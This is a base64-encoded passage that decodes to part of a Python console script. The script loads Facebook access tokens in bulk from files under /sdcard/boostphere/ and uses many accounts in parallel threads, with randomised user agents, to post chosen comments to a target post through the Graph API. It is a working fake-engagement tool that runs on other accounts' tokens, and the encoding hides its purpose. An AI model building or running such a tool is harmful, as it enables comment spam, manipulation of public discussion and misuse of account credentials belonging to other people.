SA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCgogICAgdHJ5OgogICAgICAgIG51bV9jb21tZW50cyA9IGludChpbnB1dChmIiAgICB7cmVkfUVudGVyIHRoZSBudW1iZXIgb2YgY29tbWVudHM6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIG51bV9jb21tZW50cyA8PSAwOgogICAgICAgICAgICBwcmludCgiTnVtYmVyIG9mIGNvbW1lbnRzIG11c3QgYmUgZ3JlYXRlciB0aGFuIDAuIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgY29tbWVudHNfbGlzdCA9IFtdCiAgICBmb3IgaSBpbiByYW5nZShudW1fY29tbWVudHMpOgogICAgICAgIGNvbW1lbnQgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgY29tbWVudCB7aSArIDF9OiAiKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGNvbW1lbnRzX2xpc3QuYXBwZW5kKGNvbW1lbnQpCgogICAgIyBTdGVwIDY6IEFzayBob3cgbWFueSBhY2NvdW50cyB0byB1c2UgZm9yIGNvbW1lbnRpbmcKICAgIHRyeToKICAgICAgICBudW1fYWNjb3VudHMgPSBpbnQoaW5wdXQoZiIgICB7Z3JlZW59RW50ZXIgdGhlIG51bWJlciBvZiBhY2NvdW50cyB0byB1c2UgZm9yIGNvbW1lbnRpbmcgKDEgdG8ge2xlbih0b2tlbnMpfSk6ICIpKQogICAgICAgIGlmIG51bV9hY2NvdW50cyA+IGxlbih0b2tlbnMpIG9yIG51bV9hY2NvdW50cyA8PSAwOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBiZXR3ZWVuIDEgYW5kIHtsZW4odG9rZW5zKX0uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDc6IFBlcmZvcm0gY29tbWVudHMgdXNpbmcgbXVsdGl0aHJlYWRpbmcKICAgIHJlc3VsdHMgPSBbXQogICAgY29tbWVudHNfY291bnQgPSAwCiAgICBtYXhfd29ya2VycyA9IDEwICAjIFNldCB0aGUgbWF4aW11bSBudW1iZXIgb2YgdGhyZWFkcwogICAgCiAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1tYXhfd29ya2VycykgYXMgZXhlY3V0b3I6CiAgICAgICAgZnV0dXJlX3RvX3Rva2VuID0ge30KICAgICAgICBmb3IgaSwgdG9rZW4gaW4gZW51bWVyYXRlKHRva2Vuc1s6bnVtX2FjY291bnRzXSk6CiAgICAgICAgICAgIGNvbW1lbnQgPSByYW5kb20uY2hvaWNlKGNvbW1lbnRzX2xpc3QpICAjIFJhbmRvbWx5IHBpY2sgYSBjb21tZW50CiAgICAgICAgICAgIGZ1dHVyZSA9IGV4ZWN1dG9yLnN1Ym1pdChyZXAsIHBvc3RfaWQsIGNvbW1lbnQsIHRva2VuKQogICAgICAgICAgICBmdXR1cmVfdG9fdG9rZW5bZnV0dXJlXSA9IHRva2VuCgogICAgICAgIGZvciBmdXR1cmUgaW4gYXNfY29tcGxldGVkKGZ1dHVyZV90b190b2tlbik6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgcHJpbnQocmVzdWx0KSAgIyBQcmludCB0aGUgcmVzdWx0IG9mIHRoZSBjb21tZW50IGF0dGVtcHQKICAgICAgICAgICAgICAgIGlmICJTVUNDRVNTRlVMTFkiIGluIHJlc3VsdDoKICAgICAgICAgICAgICAgICAgICBjb21tZW50c19jb3VudCArPSAxCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGYiRXJyb3IgcHJvY2Vzc2luZyB0b2tlbjoge2V9IikKCiAgICBwcmludChmIlRvdGFsIGNvbW1lbnRzIG1hZGU6IHtjb21tZW50c19jb3VudH0iKQoKZGVmIGNvbW1lbnRfd2l0aF90b2tlbihwb3N0X2lkLCBjb21tZW50LCBhY2Nlc3NfdG9rZW4pOgogICAgIiIiQ29tbWVudCBvbiBhIEZhY2Vib29rIHBvc3QgdXNpbmcgdGhlIHByb3ZpZGVkIGFjY2VzcyB0b2tlbi4iIiIKICAgIAogICAgIyBTcGxpdCB0aGUgdG9rZW4gaW4gY2FzZSBpdCBpbmNsdWRlcyAndWlkfGFjY2Vzc190b2tlbicgZm9ybWF0CiAgICBpZiAnfCcgaW4gYWNjZXNzX3Rva2VuOgogICAgICAgIF8sIGFjY2Vzc190b2tlbiA9IGFjY2Vzc190b2tlbi5zcGxpdCgnfCcsIDEpCiAgICAKICAgICMgTm93IGNoZWNrIGlmIHRoZSB0b2tlbiBzdGFydHMgd2l0aCAnRUEnIG9yICdFQUEnCiAgICBpZiBub3QgYWNjZXNzX3Rva2VuLnN0YXJ0c3dpdGgoKCJFQSIsICJFQUEiKSk6CiAgICAgICAgcmV0dXJuIGYiSW52YWxpZCB0b2tlbjoge2FjY2Vzc190b2tlbn0iCiAgICAKICAgIHRyeToKICAgICAgICBjb252ZXJ0ZWRfbGluayA9IHBvc3RfaWQKICAgICAgICBhdXRvX2NvbW1lbnRfdXJsID0gZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTMuMC97Y29udmVydGVkX2xpbmt9L2NvbW1lbnRzJwogICAgICAgIHBhcmFtcyA9IHsKICAgICAgICAgICAgJ21lc3NhZ2UnOiBjb21tZW50LAogICAgICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuCiAgICAgICAgfQogICAgICAgIHRpbWUuc2xlZXAoMSkgICMgU2xlZXAgZm9yIDEgc2Vjb25kIGJldHdlZW4gY29tbWVudHMKICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAndXNlci1hZ2VudCc6IFdfdWVyYWdudCgpICAjIFVzZSB0aGUgcmFuZG9tIHVzZXIgYWdlbnQKICAgICAgICB9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KGF1dG9fY29tbWVudF91cmwsIHBhcmFtcz1wYXJhbXMsIGhlYWRlcnM9aGVhZGVycykKICAgICAgICAKICAgICAgICAjIFByaW50IHN0YXR1cyBjb2RlIGFuZCByZXNwb25zZSBmb3IgZGVidWdnaW5nCiAgICAgICAgcGFzcwoKICAgICAgICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgIHJldHVybiBmIlwwMzNbMTszMW1bU1VDQ0VTU11cMDMzWzE7MzFtIFwwMzNbMTszMm1TVUNDRVNTRlVMTFkgQ09NTUVOVEVEOiB7Z3JlZW59e2NvbW1lbnR9XDAzM1sxOzMybSIKICAgICAgICBlbHNlOgogICAgICAgICAgICBwYXNzCgogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHBhc3MKICAgIAoKCmRlZiBwZXJmb3JtX2NvbW1lbnRfZmFzdCgpOgogICAgIiIiUGVyZm9ybSBjb21tZW50cyBiYXNlZCBvbiB1c2VyIGlucHV0IGZvciBmaWxlIGNob2ljZSwgc3RhcnRpbmcgbGluZSwgcG9zdCBsaW5rLCBhbmQgbnVtYmVyIG9mIGNvbW1lbnRzLiIiIgogICAgCiAgICAjIFN0ZXAgMTogQXNrIHRoZSB1c2VyIHdoaWNoIGZpbGUgdG8gdXNlCiAgICBmaWxlX29wdGlvbnMgPSB7CiAgICAgICAgMTogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFBQ0NPVU5ULnR4dCIsCiAgICAgICAgMjogIi9zZGNhcmQvYm9vc3RwaGVyZS9GUkFQQUdFUy50eHQiLAogICAgICAgIDM6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXQUNDT1VOVC50eHQiLAogICAgICAgIDQ6ICIvc2RjYXJkL2Jvb3N0cGhlcmUvUlBXUEFHRVMudHh0IgogICAgfQogICAgY2xlYXJfc2NyZWVuKCkKICAgIGpvdmFuKCkKICAgIHByaW50KGYiIiIgICAgIHt3aGl0ZX1DSE9PU0UgVFlQRSBPRiBSRUFDVE9SUzogCiAgICAge3llbGxvd31bMV0ge2dyZWVufUZSQSBBQ0NPVU5UIAogICAgIHt5ZWxsb3d9WzJdIHtncmVlbn1GUkEgUEFHRVMKICAgICB7eWVsbG93fVszXSB7Z3JlZW59UlBXIEFDQ09VTlQKICAgICB7eWVsbG93fVs0XSB7Z3JlZW59UlBXIFBBR0VTCiAgICAge3JlZH1bMF0ge3JlZH1FWElUIAogICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIiIikKICAgIAogICAgdHJ5OgogICAgICAgIGZpbGVfY2hvaWNlID0gaW50KGlucHV0KGYiICAgICB7Z3JlZW59Q2hvb3NlOiAiKSkKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBpZiBmaWxlX2Nob2ljZSBub3QgaW4gZmlsZV9vcHRpb25zOgogICAgICAgICAgICBwcmludCgiSW52YWxpZCBjaG9pY2UuIikKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZmlsZV9wYXRoID0gZmlsZV9vcHRpb25zW2ZpbGVfY2hvaWNlXQogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgICMgU3RlcCAyOiBMb2FkIHRoZSB0b2tlbnMgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZQogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICAgICAgdG9rZW5zID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBmaWxlLnJlYWRsaW5lcygpIGlmIGxpbmUuc3RyaXAoKV0gICMgRW5zdXJlIG5vIGVtcHR5IGxpbmVzCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAgcHJpbnQoIkZpbGUgbm90IGZvdW5kLiIpCiAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcGFzcwogICAgICAgIHJldHVybgoKICAgIGF2YWlsYWJsZV90b2tlbnMgPSBsZW4odG9rZW5zKQoKICAgICMgU3RlcCAzOiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBzdGFydGluZyBsaW5lCiAgICBpZiBhdmFpbGFibGVfdG9rZW5zID09IDA6CiAgICAgICAgcHJpbnQoIk5vIHRva2VucyBhdmFpbGFibGUgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZS4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHthdmFpbGFibGVfdG9rZW5zfSk6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIHN0YXJ0X2xpbmUgPCAxIG9yIHN0YXJ0X2xpbmUgPiBhdmFpbGFibGVfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIGxpbmUgbnVtYmVyIGJldHdlZW4gMSBhbmQge2F2YWlsYWJsZV90b2tlbnN9LiIpCiAgICAgICAgICAgIHJldHVybgogICAgZXhjZXB0IFZhbHVlRXJyb3I6CiAgICAgICAgcHJpbnQoIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlci4iKQogICAgICAgIHJldHVybgoKICAgIHRva2VucyA9IHRva2Vuc1tzdGFydF9saW5lIC0gMTpdICAjIFVzZSB0b2tlbnMgc3RhcnRpbmcgZnJvbSB0aGUgZ2l2ZW4gbGluZQogICAgCiAgICAjIFN0ZXAgNDogQXNrIGZvciB0aGUgcG9zdCBJRAogICAgYSA9IGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgcG9zdCBJRDogIikKICAgIHBvc3RfaWQgPSBnZXRfY29tYmluZWRfZGF0YShhKQogICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCgogICAgIyBTdGVwIDU6IEFzayBob3cgbWFueSBjb21tZW50cyBhbmQgZ2V0IHRoZSBsaXN0IG9mIGNvbW1lbnRzCiAgICB0cnk6CiAgICAgICAgbnVtX2NvbW1lbnRzID0gaW50KGlucHV0KGYiICAgIHtyZWR9RW50ZXIgdGhlIG51bWJlciBvZiBjb21tZW50czogIikpCiAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgaWYgbnVtX2NvbW1lbnRzIDw9IDA6CiAgICAgICAgICAgIHByaW50KCJOdW1iZXIgb2YgY29tbWVudHMgbXVzdCBiZSBncmVhdGVyIHRoYW4gMC4iKQogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KICAgIGNvbW1lbnRzX2xpc3QgPSBbXQogICAgZm9yIGkgaW4gcmFuZ2UobnVtX2NvbW1lbnRzKToKICAgICAgICBjb21tZW50ID0gaW5wdXQoZiIgICAge2dyZWVufUVudGVyIGNvbW1lbnQge2kgKyAxfTogIikKICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICBjb21tZW50c19saXN0LmFwcGVuZChjb21tZW50KQoKICAgICMgU3RlcCA2OiBBc2sgaG93IG1hbnkgYWNjb3VudHMgdG8gdXNlIGZvciBjb21tZW50aW5nCiAgICB0cnk6CiAgICAgICAgbnVtX2FjY291bnRzID0gaW50KGlucHV0KGYiICAge2dyZWVufUVudGVyIHRoZSBudW1iZXIgb2YgYWNjb3VudHMgdG8gc3VjY2Vzc2Z1bGx5IGNvbW1lbnQgKDEgdG8ge2xlbih0b2tlbnMpfSk6ICIpKQogICAgICAgIGlmIG51bV9hY2NvdW50cyA+IGxlbih0b2tlbnMpIG9yIG51bV9hY2NvdW50cyA8PSAwOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIG51bWJlciBiZXR3ZWVuIDEgYW5kIHtsZW4odG9rZW5zKX0uIikKICAgICAgICAgICAgcmV0dXJuCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDc6IFBlcmZvcm0gY29tbWVudHMsIGVuc3VyaW5nIHRoZSByZXF1aXJlZCBudW1iZXIgb2Ygc3VjY2Vzc2Z1bCBjb21tZW50cwogICAgc3VjY2Vzc2Z1bF9jb21tZW50cyA9IDAKICAgIG1heF93b3JrZXJzID0gIDIgIyBTZXQgdGhlIG1heGltdW0gbnVtYmVyIG9mIHRocmVhZHMKCiAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz1tYXhfd29ya2VycykgYXMgZXhlY3V0b3I6CiAgICAgICAgd2hpbGUgc3VjY2Vzc2Z1bF9jb21tZW50cyA8IG51bV9hY2NvdW50cyBhbmQgdG9rZW5zOgogICAgICAgICAgICB0b2tlbiA9IHRva2Vucy5wb3AoMCkgICMgVGFrZSB0aGUgbmV4dCB0b2tlbgogICAgICAgICAgICBjb21tZW50ID0gcmFuZG9tLmNob2ljZShjb21tZW50c19saXN0KSAgIyBSYW5kb21seSBwaWNrIGEgY29tbWVudAogICAgICAgICAgICBmdXR1cmUgPSBleGVjdXRvci5zdWJtaXQoY29tbWVudF93aXRoX3Rva2VuLCBwb3N0X2lkLCBjb21tZW50LCB0b2tlbikKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3VsdCA9IGZ1dHVyZS5yZXN1bHQoKQogICAgICAgICAgICAgICAgcHJpbnQocmVzdWx0KSAgIyBQcmludCB0aGUgcmVzdWx0IG9mIHRoZSBjb21tZW50IGF0dGVtcHQKICAgICAgICAgICAgICAgIGlmICJTVUNDRVNTRlVMTFkiIGluIHJlc3VsdDoKICAgICAgICAgICAgICAgICAgICBzdWNjZXNzZnVsX2NvbW1lbnRzICs9IDEgICMgSW5jcmVtZW50IG9ubHkgZm9yIHN1Y2Nlc3NmdWwgY29tbWVudHMKICAgICAgICAgICAgICAgICAgICBwcmludChmIntzdWNjZXNzZnVsX2NvbW1lbnRzfS97bnVtX2FjY291bnRzfSBjb21tZW50cyBzdWNjZXNzZnVsLiIpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHBhc3MKCiAgICAjIEZpbmFsIG91dHB1dAogICAgaWYgc3VjY2Vzc2Z1bF9jb21tZW50cyA9PSBudW1fYWNjb3VudHM6CiAgICAgICAgcHJpbnQoZiJBbGwge251bV9hY2NvdW50c30gY29tbWVudHMgd2VyZSBzdWNjZXNzZnVsbHkgbWFkZSEiKQogICAgZWxzZToKICAgICAgICBwcmludChmIk9ubHkge3N1Y2Nlc3NmdWxfY29tbWVudHN9L3tudW1fYWNjb3VudHN9IGNvbW1lbnRzIHdlcmUgc3VjY2Vzc2Z1bC4gTm8gbW9yZSB0b2tlbnMgYXZhaWxhYmxlLiIpCgpkZWYgbGl2ZV9jb21tZW50KCk6CiAgICAiIiJQZXJmb3JtIGNvbW1lbnRzIGJhc2VkIG9uIHVzZXIgaW5wdXQgZm9yIGZpbGUgY2hvaWNlLCBzdGFydGluZyBsaW5lLCBwb3N0IGxpbmssIGFuZCBudW1iZXIgb2YgY29tbWVudHMuIiIiCiAgICAKICAgICMgU3RlcCAxOiBBc2sgdGhlIHVzZXIgd2hpY2ggZmlsZSB0byB1c2UKICAgIGZpbGVfb3B0aW9ucyA9IHsKICAgICAgICAxOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQUFDQ09VTlQudHh0IiwKICAgICAgICAyOiAiL3NkY2FyZC9ib29zdHBoZXJlL0ZSQVBBR0VTLnR4dCIsCiAgICAgICAgMzogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdBQ0NPVU5ULnR4dCIsCiAgICAgICAgNDogIi9zZGNhcmQvYm9vc3RwaGVyZS9SUFdQQUdFUy50eHQiCiAgICB9CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIiIiAgICAge3doaXRlfUNIT09TRSBUWVBFIE9GIFJFQUNUT1JTOiAKICAgICB7eWVsbG93fVsxXSB7Z3JlZW59RlJBIEFDQ09VTlQgCiAgICAge3llbGxvd31bMl0ge2dyZWVufUZSQSBQQUdFUwogICAgIHt5ZWxsb3d9WzNdIHtncmVlbn1SUFcgQUNDT1VOVAogICAgIHt5ZWxsb3d9WzRdIHtncmVlbn1SUFcgUEFHRVMKICAgICB7cmVkfVswXSB7cmVkfUVYSVQgCiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIiIiKQogICAgCiAgICB0cnk6CiAgICAgICAgZmlsZV9jaG9pY2UgPSBpbnQoaW5wdXQoZiIgICAgIHtncmVlbn1DaG9vc2U6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIGZpbGVfY2hvaWNlIG5vdCBpbiBmaWxlX29wdGlvbnM6CiAgICAgICAgICAgIHByaW50KCJJbnZhbGlkIGNob2ljZS4iKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBmaWxlX3BhdGggPSBmaWxlX29wdGlvbnNbZmlsZV9jaG9pY2VdCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiUGxlYXNlIGVudGVyIGEgdmFsaWQgbnVtYmVyLiIpCiAgICAgICAgcmV0dXJuCgogICAgIyBTdGVwIDI6IExvYWQgdGhlIHRva2VucyBmcm9tIHRoZSBzZWxlY3RlZCBmaWxlCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICB0b2tlbnMgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGZpbGUucmVhZGxpbmVzKCkgaWYgbGluZS5zdHJpcCgpXSAgIyBFbnN1cmUgbm8gZW1wdHkgbGluZXMKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICBwcmludCgiRmlsZSBub3QgZm91bmQuIikKICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGxvYWRpbmcgdG9rZW5zOiB7ZX0iKQogICAgICAgIHJldHVybgoKICAgIGF2YWlsYWJsZV90b2tlbnMgPSBsZW4odG9rZW5zKQoKICAgICMgU3RlcCAzOiBBc2sgdGhlIHVzZXIgZm9yIHRoZSBzdGFydGluZyBsaW5lCiAgICBpZiBhdmFpbGFibGVfdG9rZW5zID09IDA6CiAgICAgICAgcHJpbnQoIk5vIHRva2VucyBhdmFpbGFibGUgZnJvbSB0aGUgc2VsZWN0ZWQgZmlsZS4iKQogICAgICAgIHJldHVybgoKICAgIHRyeToKICAgICAgICBzdGFydF9saW5lID0gaW50KGlucHV0KGYiICAgIHtncmVlbn1FbnRlciB0aGUgc3RhcnRpbmcgbGluZSB7cmVkfSgxIHRvIHthdmFpbGFibGVfdG9rZW5zfSk6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgIGlmIHN0YXJ0X2xpbmUgPCAxIG9yIHN0YXJ0X2xpbmUgPiBhdmFpbGFibGVfdG9rZW5zOgogICAgICAgICAgICBwcmludChmIlBsZWFzZSBlbnRlciBhIHZhbGlkIGxpbmUgbnVtYmVyIGJldHdlZW4gMSBhbmQge2F2YWlsYWJsZV90b2tlbnN9LiIpCiAgICAgICAgICAgIAogICAgICAgICAgICByZXR1cm4KICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHByaW50KCJQbGVhc2UgZW50ZXIgYSB2YWxpZCBudW1iZXIuIikKICAgICAgICByZXR1cm4KCiAgICB0b2tlbnMgPSB0b2tlbnNbc3RhcnRfbGluZSAtIDE6XSAgIyBVc2UgdG9rZW5zIHN0YXJ0aW5nIGZyb20gdGhlIGdpdmVuIGxpbmUKICAgIAogICAgIyBTdGVwIDQ6IEFzayBmb3IgdGhlIHBvc3QgSUQKICAgIGEgPSBpbnB1dChmIiAgICB7Z3JlZW59RW50ZXIgdGhlIHBvc3QgSUQ6ICIpCiAgICBwb3N0X2lkID0gZ2V0X2NvbWJpbmVkX2RhdGEoYSkKICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQoKICAgICMgU3RlcCA1OiBBc2sgaG93IG1hbnkgY29tbWVudHMgYW5kIGdldCB0aGUgbGlzdCBvZiBjb21tZW50cwogICAgdHJ5OgogICAgICAgIG51bV9jb21tZW50cyA9IGludChpbnB1dChmIiAgICB7cmVkfUVudGVyIHRoZSBudW1iZXIgb2YgY29tbWVudHM6ICIpKQogICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgO